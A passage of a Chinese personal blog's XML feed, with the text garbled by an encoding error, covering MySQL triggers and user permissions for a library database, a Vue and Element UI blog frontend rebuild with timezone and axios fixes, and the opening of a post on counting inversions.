<li><p>è§¦å‘å™¨</p>
<p>â€‹      ç”±äº<code>MySQL5.6</code>ä¸æ”¯æŒ<code>check</code>åŠŸèƒ½ï¼Œå› æ­¤éœ€è¦é€šè¿‡è§¦å‘å™¨é™åˆ¶æŸäº›å±æ€§çš„å€¼çš„èŒƒå›´ã€‚</p>
<ol>
<li><p>ä¹¦ç±æ•°é‡å¿…é¡»æ˜¯éè´Ÿæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_INSERT&#96; BEFORE INSERT ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;æ‚¨è¾“å…¥çš„åº“å­˜é‡ä¸ç¬¦åˆç°å®æ„ä¹‰ï¼š&#39;;</span><br><span class="line">END IF;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_UPDATE&#96; BEFORE UPDATE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;æ–°çš„çš„åº“å­˜é‡ä¸ç¬¦åˆç°å®æ„ä¹‰ï¼š&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¹¦ç±æ•°é‡å¿…é¡»æ˜¯éè´Ÿæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_INSERT&#96; BEFORE INSERT ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 OR NEW.AGE &gt; 200 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;æˆ·å¹´é¾„ä¸ç¬¦åˆç°å®æ„ä¹‰ï¼š&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_UPDATE&#96; BEFORE UPDATE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;æ–°çš„ç”¨æˆ·å¹´é¾„ä¸ç¬¦åˆç°å®æ„ä¹‰ï¼š&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç”¨æˆ·åˆ é™¤ä¹‹å‰éœ€è¦å½’è¿˜æ‰€æœ‰ä¹¦ç±</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PEOPLE_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PEOPLE_DELETE&#96; BEFORE DELETE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF EXISTS </span><br><span class="line">    (SELECT </span><br><span class="line">        * </span><br><span class="line">    FROM</span><br><span class="line">        borrowings </span><br><span class="line">    WHERE old.PNO &#x3D; borrowings.&#96;PNO&#96; </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0) </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;è¯¥ç”¨æˆ·ä»æœ‰æœªå½’è¿˜çš„ä¹¦ç±ï¼Œæ— æ³•åˆ é™¤&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¹¦ç±åˆ é™¤ä¹‹å‰ç¡®ä¿è¯¥ä¹¦ç±å·²å½’è¿˜å®Œæ¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_DELETE&#96; BEFORE DELETE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF EXISTS (</span><br><span class="line">SELECT * FROM</span><br><span class="line">borrowings</span><br><span class="line">WHERE old.BNO &#x3D; borrowings.&#96;BNO&#96; AND borrowings.&#96;ISRETURN&#96; &#x3D; 0</span><br><span class="line">)</span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;è¯¥ä¹¦ç±ä»æœ‰æœªå½’è¿˜çš„è®°å½•ï¼Œæ— æ³•åˆ é™¤&#39;;</span><br><span class="line">END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¹¦è®°å…¥åº“æ•°é‡ä¸èƒ½æ˜¯è´Ÿæ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PUT_IN_STORAGE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PUT_IN_STORAGE&#96; BEFORE INSERT ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF new.NUM &lt; 0 THEN</span><br><span class="line">    SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;å…¥åº“é‡ä¸èƒ½æ˜¯è´Ÿæ•°&#39;;</span><br><span class="line">    END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸èƒ½éšä¾¿ä¿®æ”¹å…¥åº“è®°å½•ä¸­çš„å…¥åº“æ•°é‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;WAREHOUSINGS_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;WAREHOUSINGS_UPDATE&#96; BEFORE UPDATE ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF new.NUM !&#x3D; old.NUM </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;å…¥åº“é‡ä¸èƒ½éšæ„ä¿®æ”¹&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>ç”¨æˆ·æƒé™è®¾ç½®</p>
<table>
<thead>
<tr>
<th><strong>ç”¨æˆ·</strong></th>
<th><strong>æƒé™</strong></th>
</tr>
</thead>
<tbody><tr>
<td>root</td>
<td>å¯¹æ•´ä¸ªæ•°æ®åº“bookbrdbæ‹¥æœ‰æ‰€æœ‰æƒ</td>
</tr>
<tr>
<td>bookAdmin</td>
<td>å¯¹ä¹¦ç±è¡¨æ‹¥æœ‰æ‰€æœ‰æƒã€å€Ÿé˜…è¡¨æœ‰æ’å…¥ã€é€‰æ‹©ã€æ›´æ–°æƒ</td>
</tr>
<tr>
<td>userAdmin</td>
<td>å¯¹ç”¨æˆ·è¡¨æ‹¥æœ‰æ‰€æœ‰æƒ</td>
</tr>
<tr>
<td>booksellerAdmin</td>
<td>å¯¹ä¹¦å•†è¡¨æ‹¥æœ‰æ‰€æœ‰æƒã€å…¥åº“è¡¨æ‹¥æœ‰æ’å…¥æƒã€é€‰æ‹©æƒã€ä¹¦ç±è¡¨æœ‰æ›´æ–°æƒ</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>æ•°æ®åº“</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºäºVueå’ŒElement UIæ­å»ºçš„åšå®¢å‰ç«¯ç•Œé¢</title>
    <url>/2021/02/07/%E5%9F%BA%E4%BA%8EVue%E5%92%8CElement-UI%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<p><a href="https://github.com/YaleXin/rblog/tree/relese-1.0" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a></p>
<p><a href="https://yalexin.gitee.io/rblog-demo/index.html#">æ¼”ç¤ºåœ°å€</a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰æˆ‘çš„<a href="https://www.yalexin.top/" target="_blank" rel="noopener">ä¸ªäººåšå®¢ç³»ç»Ÿ</a>æ˜¯ä½¿ç”¨<code>SpringBoot</code>å’Œ<code>thymeleaf</code>æ¨¡æ¿å¼•æ“å¼€å‘çš„ï¼Œä¸ªäººè§‰å¾—è¿˜å¯ä»¥ï¼Œæœ€è¿‘çªå‘å¥‡æƒ³ï¼Œä½•ä¸å€Ÿç‚¹æ—¶é—´ï¼ŒæŠŠåšå®¢é‡æ„ä¸€ä¸‹ï¼Œä½¿ç”¨<code>Vue</code>ä½œä¸ºå‰ç«¯ï¼Œ<code>SpringBoot</code>æœ€ä¸ºåç«¯ï¼Œå‰åç«¯åˆ†ç¦»ï¼Œç»§ç»­å¤¯å®è‡ªå·±çš„å®åŠ›ã€‚</p>
<a id="more"></a>

<h2 id="å®ç°æ–¹æ³•"><a href="#å®ç°æ–¹æ³•" class="headerlink" title="å®ç°æ–¹æ³•"></a>å®ç°æ–¹æ³•</h2><p>å¤§æ¦‚çš„æ€è·¯æ˜¯æ²¿ç”¨å¤§éƒ¨åˆ†æ—§åšå®¢çš„åç«¯é€»è¾‘ï¼Œä¹‹å‰æŒä¹…å±‚æ˜¯ä½¿ç”¨<code>JPA</code>ï¼Œåé¢è§†å…·ä½“æƒ…å†µè€Œå®šï¼Œæœ‰å¯èƒ½æ¢ç”¨<code>MyBatis</code>ã€‚</p>
<p>å‰ç«¯ä½¿ç”¨<code>Vue</code>ä½œä¸ºæ¨¡æ¿å¼•æ“ï¼Œ æ˜¯å½“ä¸‹å¾ˆç«çš„ä¸€ä¸ª<code>JavaScript MVVM</code>åº“ï¼Œå®ƒæ˜¯ä»¥æ•°æ®é©±åŠ¨å’Œç»„ä»¶åŒ–çš„æ€æƒ³æ„å»ºçš„ï¼Œåœ¨å›½å†…ååˆ†æµè¡Œï¼Œåœ¨è¿™é‡Œä¹Ÿä¸å¾—ä¸å´‡æ‹œä¸€ä¸‹å°¤å¤§ã€‚</p>
<p><code>UI</code>éƒ¨åˆ†ï¼Œé‰´äºä¸ªäººèƒ½åŠ›å¤ªèœï¼Œ:Dï¼Œä½¿ç”¨åŸç”Ÿä¸‰ä»¶å¥—åšå‡ºæ¥çš„ç•Œé¢å®åœ¨æ˜¯å¤ªä¸‘ï¼Œåªå¥½å€ŸåŠ©ç¬¬ä¸‰æ–¹<code>UI</code>æ¡†æ¶ï¼Œè¿™é‡Œé‡‡ç”¨<code>Element UI</code>ï¼ŒåŸæœ¬æƒ³ä½¿ç”¨<code>Bootstrap</code>ï¼Œä½†æ˜¯åœ¨<code>Vue</code>æ¡†æ¶çš„å‰æä¸‹ï¼Œä½¿ç”¨<code>Element UI</code>ä¸Šæ‰‹ä¼šå®¹æ˜“å¾—å¤šï¼Œæ¯•ç«Ÿï¼Œ<code>ElementUI</code>å°±æ˜¯åŸºäº<code>Vue 2.0</code>å¼€å‘çš„ï¼Œæ–‡æ¡£ä¹Ÿæ˜¯æ¯”è¾ƒé½å…¨ï¼Œä½†æ˜¯ä½¿ç”¨è¯¥æ¡†æ¶çš„è¿‡ç¨‹ï¼Œæˆ‘ä¹Ÿè¸©äº†ä¸€äº›å‘ï¼Œè¿™äº›å‘åœ¨å®˜æ–¹æ–‡æ¡£ä¸­éƒ½æ˜¯æ²¡æœ‰è¯´æ˜ç™½çš„ï¼š</p>
<ul>
<li><p><code>Backtop</code>ç»„ä»¶éœ€è¦æ˜¯çˆ¶èŠ‚ç‚¹çš„ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹ã€‚</p>
</li>
<li><p><code>Select</code>é€‰æ‹©å™¨å¿…é¡»ç»™å…¶ä¸€ä¸ªå®½åº¦ï¼Œä¸ç„¶æ–‡å­—ä¸æ˜¾ç¤º</p>
</li>
<li><p>è¡¨æ ¼ç»„ä»¶ä¸­å¦‚æœæƒ³è¦å®ç°å•å…ƒæ ¼å±…ä¸­ï¼Œéœ€è¦ç»™<code>el-table-column</code>ç»„ä»¶ä¸€ä¸ªå±æ€§<code>align=&quot;center&quot;</code></p>
</li>
</ul>
<h2 id="æ¶‰åŠåˆ°çš„é¡¹ç›®"><a href="#æ¶‰åŠåˆ°çš„é¡¹ç›®" class="headerlink" title="æ¶‰åŠåˆ°çš„é¡¹ç›®"></a>æ¶‰åŠåˆ°çš„é¡¹ç›®</h2><ul>
<li><a href="https://cn.vuejs.org/" target="_blank" rel="noopener"><code>Vue</code></a></li>
<li><a href="https://element.eleme.cn/" target="_blank" rel="noopener">Element UI</a></li>
<li><a href="http://axios-js.com/" target="_blank" rel="noopener">axios</a></li>
<li><a href="https://prismjs.com/" target="_blank" rel="noopener"><code>prism</code></a>(ä»£ç é«˜äº®)</li>
<li><a href="https://typo.sofi.sh/" target="_blank" rel="noopener"><code>typo.css</code></a>(æ–‡ç« æ ·å¼)</li>
<li><a href="https://github.com/animate-css/animate.css" target="_blank" rel="noopener">animate.css</a> </li>
<li><a href="http://fancyapps.com/fancybox/" target="_blank" rel="noopener"><code>fancybox</code></a> </li>
<li><a href="https://github.com/zhaoxuhui1122/vue-markdown" target="_blank" rel="noopener">vue-markdown</a> </li>
<li><a href="https://www.jinrishici.com/" target="_blank" rel="noopener">ä»Šæ—¥è¯—è¯</a></li>
<li><a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener">Font Awesome</a></li>
<li>â€¦</li>
</ul>
<h2 id="å‰ç«¯å®ç°"><a href="#å‰ç«¯å®ç°" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h2><h3 id="å‰å°"><a href="#å‰å°" class="headerlink" title="å‰å°"></a>å‰å°</h3><h4 id="é¦–é¡µ"><a href="#é¦–é¡µ" class="headerlink" title="==é¦–é¡µ=="></a>==é¦–é¡µ==</h4><p><img src="https://qiniu.yalexin.top/home.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-home.png" alt></p>
<h4 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="==åˆ†ç±»=="></a>==åˆ†ç±»==</h4><p><img src="https://qiniu.yalexin.top/ctgr.png" alt><br><img src="https://qiniu.yalexin.top/m-ctgr.png" alt></p>
<h4 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="==æ ‡ç­¾=="></a>==æ ‡ç­¾==</h4><p><img src="https://qiniu.yalexin.top/tag.png" alt><br><img src="https://qiniu.yalexin.top/m-tag.png" alt></p>
<h4 id="å‹é“¾"><a href="#å‹é“¾" class="headerlink" title="==å‹é“¾=="></a>==å‹é“¾==</h4><p><img src="https://qiniu.yalexin.top/link.png" alt><br><img src="https://qiniu.yalexin.top/m-link.png" alt></p>
<h4 id="ç•™è¨€"><a href="#ç•™è¨€" class="headerlink" title="==ç•™è¨€=="></a>==ç•™è¨€==</h4><p><img src="https://qiniu.yalexin.top/talk.png" alt><br><img src="https://qiniu.yalexin.top/m-talk.png" alt></p>
<h4 id="å½’æ¡£"><a href="#å½’æ¡£" class="headerlink" title="==å½’æ¡£=="></a>==å½’æ¡£==</h4><p><img src="https://qiniu.yalexin.top/archive.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-archive.png" alt></p>
<h4 id="æ–‡ç« è¯¦æƒ…"><a href="#æ–‡ç« è¯¦æƒ…" class="headerlink" title="==æ–‡ç« è¯¦æƒ…=="></a>==æ–‡ç« è¯¦æƒ…==</h4><p><img src="https://qiniu.yalexin.top/blog-1.png" alt></p>
<h4 id="èµèµ"><a href="#èµèµ" class="headerlink" title="==èµèµ=="></a>==èµèµ==</h4><p><img src="https://qiniu.yalexin.top/ap1.png" alt></p>
<h4 id="åº•éƒ¨"><a href="#åº•éƒ¨" class="headerlink" title="==åº•éƒ¨=="></a>==åº•éƒ¨==</h4><p><img src="https://qiniu.yalexin.top/m-footer.png" alt></p>
<h3 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h3><h4 id="ç™»å½•ç•Œé¢"><a href="#ç™»å½•ç•Œé¢" class="headerlink" title="==ç™»å½•ç•Œé¢=="></a>==ç™»å½•ç•Œé¢==</h4><p><img src="https://qiniu.yalexin.top/admin-login.png" alt></p>
<h4 id="åšå®¢åˆ—è¡¨"><a href="#åšå®¢åˆ—è¡¨" class="headerlink" title="==åšå®¢åˆ—è¡¨=="></a>==åšå®¢åˆ—è¡¨==</h4><p><img src="https://qiniu.yalexin.top/admin-blogList.png" alt></p>
<h4 id="ç¼–è¾‘åšå®¢"><a href="#ç¼–è¾‘åšå®¢" class="headerlink" title="==ç¼–è¾‘åšå®¢=="></a>==ç¼–è¾‘åšå®¢==</h4><p><img src="https://qiniu.yalexin.top/admin-blog-edit.png" alt></p>
<h4 id="åˆ†ç±»ç®¡ç†"><a href="#åˆ†ç±»ç®¡ç†" class="headerlink" title="==åˆ†ç±»ç®¡ç†=="></a>==åˆ†ç±»ç®¡ç†==</h4><p> <img src="https://qiniu.yalexin.top/admin-ctgr.png" alt> </p>
<h4 id="æ ‡ç­¾ç®¡ç†"><a href="#æ ‡ç­¾ç®¡ç†" class="headerlink" title="==æ ‡ç­¾ç®¡ç†=="></a>==æ ‡ç­¾ç®¡ç†==</h4><p> <img src="https://qiniu.yalexin.top/admin-tag.png" alt> </p>
<h4 id="è¯„è®ºç®¡ç†"><a href="#è¯„è®ºç®¡ç†" class="headerlink" title="==è¯„è®ºç®¡ç†=="></a>==è¯„è®ºç®¡ç†==</h4><p> <img src="https://qiniu.yalexin.top/admin-cmt.png" alt> </p>
<h4 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="==ç”¨æˆ·ä¿¡æ¯=="></a>==ç”¨æˆ·ä¿¡æ¯==</h4><p> <img src="https://qiniu.yalexin.top/admin-user.png" alt> </p>
<h2 id="å‰åç«¯åˆ†ç¦»é‡åˆ°çš„å‘"><a href="#å‰åç«¯åˆ†ç¦»é‡åˆ°çš„å‘" class="headerlink" title="å‰åç«¯åˆ†ç¦»é‡åˆ°çš„å‘"></a>å‰åç«¯åˆ†ç¦»é‡åˆ°çš„å‘</h2><h3 id="å‰ç«¯Dateæ•°æ®ç±»å‹ä¸æ•°æ®åº“ä¸ä¸€è‡´"><a href="#å‰ç«¯Dateæ•°æ®ç±»å‹ä¸æ•°æ®åº“ä¸ä¸€è‡´" class="headerlink" title="å‰ç«¯Dateæ•°æ®ç±»å‹ä¸æ•°æ®åº“ä¸ä¸€è‡´"></a>å‰ç«¯Dateæ•°æ®ç±»å‹ä¸æ•°æ®åº“ä¸ä¸€è‡´</h3><p>å…·ä½“è€Œè¨€ï¼Œæ˜¯å‰ç«¯æ¥æ”¶åˆ°çš„æ—¶é—´æ¯”æ•°æ®åº“ä¸­æ…¢8ä¸ªå°æ—¶ï¼Œæ˜¯å› ä¸ºæˆ‘åœ¨æ•°æ®åº“URLä¸­è®¾ç½®äº†æ—¶åŒºæ˜¯äºšæ´²ä¸Šæµ·ï¼Œå³ä¸œå…«åŒºï¼Œè€Œå‰åç«¯ä¼ é€æ•°æ®æ—¶å€™é»˜è®¤ä½¿ç”¨UTCæ—¶é—´ï¼Œå› æ­¤å‰ç«¯æ¥æ”¶çš„æ—¶å€™ä¼šè‡ªåŠ¨å‡å»8å°æ—¶ï¼Œè¿™æ—¶å€™è¦ä¹ˆæŒ‡å®šè¿æ¥æ•°æ®åº“æ—¶æ—¶åŒºä¸ºUTCï¼Œè¦ä¹ˆæŒ‡å®šæ•°æ®ä¼ è¾“ä½¿ç”¨çš„æ—¶åŒºï¼Œä¾‹å¦‚åœ¨Spring Bootæ¡†æ¶ä¸­å¯ä»¥è¿™æ ·è®¾ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?serverTimezone=Asia/Shanghai</span></span><br></pre></td></tr></table></figure>

<h3 id="axiosä½¿ç”¨deleteæ–¹æ³•ï¼Œåç«¯æ— æ³•æ¥æ”¶"><a href="#axiosä½¿ç”¨deleteæ–¹æ³•ï¼Œåç«¯æ— æ³•æ¥æ”¶" class="headerlink" title="axiosä½¿ç”¨deleteæ–¹æ³•ï¼Œåç«¯æ— æ³•æ¥æ”¶"></a>axiosä½¿ç”¨deleteæ–¹æ³•ï¼Œåç«¯æ— æ³•æ¥æ”¶</h3><p>ä¸€èˆ¬ä½¿ç”¨putæˆ–è€…postæ–¹å¼æ—¶å€™ï¼Œä¼ é€æ•°æ®æ˜¯è¿™æ ·å­çš„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.put(<span class="string">"/admin/blog/add"</span>, &#123;</span><br><span class="line">	data: <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.blog)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>spring boot åå°æ¥æ”¶æ•°æ®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line"><span class="function">ResponseEntity <span class="title">addBlog</span><span class="params">(@RequestBody HashMap json)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å½“æˆ‘ä½¿ç”¨ç±»ä¼¼çš„æ–¹æ³•æ‰§è¡Œdeleteæ–¹æ³•æ—¶å€™ï¼Œåå°ä¸€ç›´æŠ›å¼‚å¸¸</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Resolved [<span class="type">org.springframework.http.converter.HttpMessageNotReadableException</span>: <span class="type">Required</span> <span class="type">request</span> <span class="type">body</span> <span class="type">is</span> <span class="type">missing</span>: <span class="type">org.springframework.http.ResponseEntity</span> <span class="type">top.yalexin.rblog.controller.admin.AdminCommentController.deleteComment</span>(<span class="type">java.util.HashMap</span>)]</span><br></pre></td></tr></table></figure>

<p>åæ¥æŸ¥èµ„æ–™æ‰çŸ¥é“deleteçš„å†…éƒ¨å®ç°åŸç†ä¸å…¶ä»–å‡ ä¸ªçš„ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦å¦‚æ­¤è®¾ç½®dataå¯¹è±¡æ‰å¯ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.delete(<span class="string">"/admin/comment/delete"</span>, &#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">      id: <span class="built_in">JSON</span>.stringify(cmtId)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>æ¡†æ¶</tag>
        <tag>UI</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºäºåˆ†æ²»æ³•çš„ç‰¹å®šæ•°åˆ—é€†åºæ•°æ±‚æ³•</title>
    <url>/2022/09/29/%E5%9F%BA%E4%BA%8E%E5%88%86%E6%B2%BB%E6%B3%95%E7%9A%84%E7%89%B9%E5%AE%9A%E6%95%B0%E5%88%97%E9%80%86%E5%BA%8F%E6%95%B0%E6%B1%82%E6%B3%95/</url>
    <content><![CDATA[<p>å¿™é‡Œå·é—²ï¼Œè®°å½•ä¸€ä¸‹ä½¿ç”¨<strong>åˆ†æ²»æ³•</strong>æ±‚é€†åºæ•°çš„å®ç°è¿‡ç¨‹ã€‚</p>
<a id="more"></a>

<h2 id="ç®—æ³•è®¾è®¡"><a href="#ç®—æ³•è®¾è®¡" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><p><strong>é€†åºï¼š</strong>åœ¨ä¸€ä¸ªæ’åˆ—ä¸­ï¼Œå¦‚æœä¸€å¯¹æ•°çš„å‰åä½ç½®ä¸å¤§å°é¡ºåºç›¸åï¼Œå³å‰é¢çš„æ•°å¤§äºåé¢çš„æ•°ï¼Œé‚£ä¹ˆå®ƒä»¬å°±ç§°ä¸ºä¸€ä¸ªé€†åºã€‚ä¾‹å¦‚<code>&lt;3,1&gt;</code>å°±æ˜¯ä¸€ä¸ªé€†åºã€‚</p>
<p><strong>é€†åºæ•°ï¼š</strong>ç»™å®šæ•°åˆ—ä¸­ï¼Œé€†åºçš„æ•°ç›®ã€‚ä¾‹å¦‚æ•°åˆ—:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1,3,4,2]</span><br></pre></td></tr></table></figure>

